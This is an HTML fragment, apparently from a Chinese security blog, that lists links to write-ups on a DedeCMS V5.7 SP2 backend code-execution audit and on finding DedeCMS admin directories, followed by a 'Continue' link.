-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>代码审计之DedeCMS V5.7 SP2后台存在代码执行漏洞(<a href="https://mochazz.github.io/2018/03/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BDedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/" target="_blank" rel="noopener">https://mochazz.github.io/2018/03/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BDedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/</a>)</p>
-<p>奇技淫巧 | DEDECMS找后台目录(<a href="https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/</a>)</p>
-<p>膜前辈师傅们~</p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/08/21/Dedecms V5.7 SP2代码审计/">
             Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
